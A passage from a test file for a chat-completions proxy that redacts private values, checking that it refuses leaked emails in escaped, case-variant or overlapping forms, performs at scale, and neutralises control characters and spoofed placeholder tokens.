    expect(logs.join('\n')).not.toContain(EMAIL)
  })

  it('names an array index in a refusal as the index', async () => {
    const res = await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `id ${TWID}` }, { role: 'tool', tool_call_id: 't', content: `ref${TWID}` }] })
    expect(res.status).toBe(422)
    expect(await res.text()).toContain('/messages/1/content')
  })

  it('refuses an ASCII case variant of a detected value, but not ordinary text beside it', async () => {
    reply = () => ({ json: { choices: [] } })
    const variant = await post('/v1/chat/completions', { model: 'm', metadata: { owner: EMAIL.toUpperCase() }, messages: [{ role: 'user', content: `hi ${EMAIL}` }] })
    expect(variant.status).toBe(422)
    expect(seen).toHaveLength(0)
    const ordinary = await post('/v1/chat/completions', { model: 'm', metadata: { topic: 'Example Test notes' }, messages: [{ role: 'user', content: `hi ${EMAIL}, see the Example.Test docs` }] })
    expect(ordinary.status).toBe(200)
  })

  it('refuses a detected value written JSON-escaped in a field it does not rewrite', async () => {
    const res = await post('/v1/chat/completions', { model: 'm', metadata: { args: JSON.stringify({ p: QUOTED }) }, messages: [{ role: 'user', content: USER_TEXT }] })
    expect(res.status).toBe(422)
    expect(seen).toHaveLength(0)
  })

  it('refuses a value that ends inside a longer overlapping value', async () => {
    await start({ redaction: { terms: ['ab', 'xabc'] } })
    try {
      const res = await post('/v1/chat/completions', { model: 'm', metadata: { tag: 'xab' }, messages: [{ role: 'user', content: 'ab and xabc' }] })
      expect(res.status).toBe(422)
      expect(seen).toHaveLength(0)
    } finally {
      await start()
    }
  })

  it('checks thousands of distinct values for leaks in one pass', async () => {
    reply = () => ({ json: { choices: [] } })
    const messages = Array.from({ length: 16_000 }, (_, i) => ({ role: 'user', content: `u${i}.fictional@example.test` }))
    const started = process.cpuUsage()
    expect((await post('/v1/chat/completions', { model: 'm', messages })).status).toBe(200)
    const used = process.cpuUsage(started)
    expect((used.user + used.system) / 1_000).toBeLessThan(2_000)
  })

  it('replaces control characters and stray delimiters by default, and refuses them on request', async () => {
    reply = () => ({ json: { choices: [] } })
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `\u001b[31mred\u001b[0m ⟦EMAIL_9⟧ ${EMAIL}` }] })
    expect(seen[0]!.body.messages[0].content).toBe('␛[31mred␛[0m ⟪EMAIL_9⟫ ⟦EMAIL_1⟧')
    await start({ screen: 'refuse' })
    try {
      const res = await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: '\u001b[31m' }] })
      expect(res.status).toBe(422)
      expect(await res.text()).toContain('/messages/0/content')
      expect(seen).toHaveLength(1)
    } finally {
      await start()
    }
  })
})
